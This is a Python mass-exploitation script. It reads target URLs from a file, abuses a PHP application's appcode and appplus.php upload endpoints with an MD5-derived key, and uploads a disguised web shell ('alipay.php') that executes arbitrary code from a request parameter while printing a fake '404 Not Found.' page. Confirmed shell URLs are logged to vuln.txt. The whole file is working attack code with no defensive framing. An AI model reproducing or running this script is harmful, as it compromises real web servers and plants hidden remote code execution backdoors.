import requests
import hashlib
import threadpool
import urllib3
import random

urllib3.disable_warnings()
header = {
    "Proxy-Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
    "Connection": "close",
}
proxy = {       # debug
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl


def exp(url):
    shell_name = "alipay.php"
    shell_content = "<?php $a=create_function(NULL,$_REQUEST['a']);$a();echo '404 Not Found.';?>"
    shell_path = "base"
    try:
        req1 = requests.post(url + "/base/post.php", headers=header, verify=False, data="act=appcode", timeout=25)
        text = req1.text
        if req1.status_code == 200 and "k=" in text:
            k = text[2:text.find("&t=")].encode("utf-8")
            m = hashlib.md5()
            m.update(k)
            md5_k = m.hexdigest()
            header["Content-Type"] = "multipart/form-data; boundary=---------------------------191691572411478"
            payload = "-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"act\"\r\n\r\nupload\r\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"m\"\r\n\r\n" + md5_k + "\r\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n" + shell_path + "\r\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"r_size\"\r\n\r\n" + str(len(shell_content)) +"\r\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + shell_name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + shell_content + "\r\n-----------------------------191691572411478--"
            req2 = requests.post(url + "/base/appplus.php", headers=header, verify=False, data=payload, timeout=25)
            if req2.status_code == 200 and shell_name in req2.text:
                shell = url + "/" + shell_path + "/" + shell_name
                req3 = requests.get(shell, headers=header, verify=False, timeout=25)
                if req3.status_code == 200 and "404 Not Found." in req3.text:
                    print(wirte_targets(shell, "vuln.txt"))
    except:
        return


def multithreading(funcname, params=[], filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 10)   # 默认10线程


if __name__ == "__main__":
    main()
